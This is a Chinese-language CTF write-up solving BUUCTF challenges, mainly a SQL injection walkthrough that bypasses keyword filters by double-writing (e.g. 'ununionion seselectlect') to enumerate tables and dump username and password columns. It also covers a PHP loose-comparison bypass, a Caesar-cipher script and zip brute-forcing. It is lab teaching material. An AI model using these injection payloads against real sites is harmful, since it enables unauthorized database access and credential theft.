# BUUCTF-sql双写绕过

## WEB

### [极客大挑战 2019]BabySQL

打开环境 查看什么类型

输入

```cobol
输入1'
username='1''&password='1''
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c429319ec81089e0813ef41514c439f6.png" alt="" style="max-height:356px; box-sizing:content-box;" />


字符型

我们开始尝试万能密码

```vbnet
1' or 1=1-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7dd04fb2b6536e9b733df5fe446d665e.png" alt="" style="max-height:345px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/17efeca3cc39bdf440e90f482faf32db.png" alt="" style="max-height:142px; box-sizing:content-box;" />


发现返回的东西和我们输入不一样  or没了

```undefined
过滤了or 
```

这个是关键 我们使用双写绕过

```vbnet
1' oorr 1=1-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3f1952360d1ef06fd7d75f10c8098c8e.png" alt="" style="max-height:339px; box-sizing:content-box;" />


得到了账号密码

我们开始sql注入

```cobol
1. 字段数
 
username=admin&password=''1' order by 4-- +''
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/98309db83e97fe952a63b9cf2e6d9e83.png" alt="" style="max-height:241px; box-sizing:content-box;" />


发现or 过滤了 我们看看

```csharp
1' oorrder by 4-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/06159ab8b868cfb1ec2a8a1c12cae7ec.png" alt="" style="max-height:247px; box-sizing:content-box;" />


还是报错 我们接着看看是不是过滤了 by 因为如果过滤了der 他会返回or

```vbnet
1' oorrder bbyy 4-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a21855351f4e6060a55b26d61616b563.png" alt="" style="max-height:251px; box-sizing:content-box;" />


成功了 三个字段

我们开始爆破数据库

```cobol
0' union select 1,2,database()-- +    报错'1,2,database()-- '

0' ununion select 1,2,database()-- +   报错'un 1,2,database()-- ''

0' ununionion seselectlect 1,2,database()-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/53243bd15de44284f478b3e48cfc53bd.png" alt="" style="max-height:341px; box-sizing:content-box;" />


得到数据库名 geek

开始爆表

```csharp
0' ununionion seselectlect 1,2,group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere table_schema='geek'-- +
 
经过尝试 union select  or from where 都过滤了 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f564fb8797ff0673e810344ba5e8cd7a.png" alt="" style="max-height:354px; box-sizing:content-box;" />


开始爆数据

```cobol
0' ununionion seselectlect 1,2,group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'-- +


0' ununionion seselectlect 1,2,group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/918856b363b9a9071946f0d17a53ed22.png" alt="" style="max-height:270px; box-sizing:content-box;" />


都是返回这些名

```vbnet
0' ununionion seselectlect 1,2,group_concat(id,username,passwoorrd)frfromom geek.b4bsql-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/00fe47954612ba9043a6e2341b1a8646.png" alt="" style="max-height:231px; box-sizing:content-box;" />


得到flag

### [ACTF2020 新生赛]BackupFile

打开环境



<img src="https://i-blog.csdnimg.cn/blog_migrate/6017c3fa73fb9265f1adfa17b39fc7fb.png" alt="" style="max-height:196px; box-sizing:content-box;" />


让我们找源文件

我们想到

```delphi
index.php.bak
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0559d953505af37947cba22ca835f169.png" alt="" style="max-height:144px; box-sizing:content-box;" />


下载成功

我们得到备份文件

```php
<?php
include_once "flag.php";
 
if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

这里就得到绕过两个 一个是is_numeric() 另一个是==

```cobol
！is_numeric()：
如果为数字或者数字字符串 True
如果不是 返回 false
!0=1
所以我们需要这个是数字或者数字字符串
 
 
==
'123a'==123 True
```

这样就很简单了

```cobol
key=123
 
 
 
123为数字 所以
!is_numeric() 绕过
 
 
因为==弱比较
所以
 
123=123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3 true
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/04a00040d2b75323ba651c46a2d60a15.png" alt="" style="max-height:238px; box-sizing:content-box;" />


得到flag

## Crypto

### Alice与Bob



<img src="https://i-blog.csdnimg.cn/blog_migrate/cbba5a68d25d31a24d5713395d09044d.png" alt="" style="max-height:175px; box-sizing:content-box;" />


 [http://www.jsons.cn/quality/](http://www.jsons.cn/quality/) 



<img src="https://i-blog.csdnimg.cn/blog_migrate/a1afecca8b76650071b04be1571972ea.png" alt="" style="max-height:320px; box-sizing:content-box;" />


合并

```cobol
101999966233
```

 [CTF在线工具-哈希计算|MD5、SHA1、SHA256、SHA384、SHA512、RIPEMD、RIPEMD160](http://www.hiencode.com/hash.html) 

进行MD5计算



<img src="https://i-blog.csdnimg.cn/blog_migrate/c941ede7938ea52a1015f508b08f84d0.png" alt="" style="max-height:511px; box-sizing:content-box;" />


### 大帝的密码武器

下载得到题目和密文 意思就是让我们解密题目 然后取得偏移量 然后在加密密文

```cobol
str1 = 'FRPHEVGL'
str2 = str1.lower()
num = 1
for i in range(26):
    print("{:<2d}".format(num),end = ' ')
    for j in str2:
        if(ord(j)+num > ord('z')):
            print(chr(ord(j)+num-26),end='')
        else:
            print(chr(ord(j)+num),end='')
    num += 1
    print('')
```

使用代码取得26次的解密



<img src="https://i-blog.csdnimg.cn/blog_migrate/da8c3f88d26423d04064ec9b9ff426cc.png" alt="" style="max-height:126px; box-sizing:content-box;" />


偏移量为13 的时候得到单词

我们把密文加密 偏移量为13

提交flag

## Misc

### ningen

改后缀 为zip

暴力破解

### 小明的保险箱

同理

### 爱因斯坦

下载文件 查看属性



<img src="https://i-blog.csdnimg.cn/blog_migrate/22077d5741b36f269837fb98e0a6c60f.png" alt="" style="max-height:327px; box-sizing:content-box;" />


提到password 说明加密

我们改后缀



<img src="https://i-blog.csdnimg.cn/blog_migrate/f4d064ea8f6220485eb6a84dceb9e469.png" alt="" style="max-height:734px; box-sizing:content-box;" />


没有提示 只有刚刚的那个not password 试一试



<img src="https://i-blog.csdnimg.cn/blog_migrate/b28cdfd7cb428dd00db2d70cf61c0036.png" alt="" style="max-height:781px; box-sizing:content-box;" />


得到flag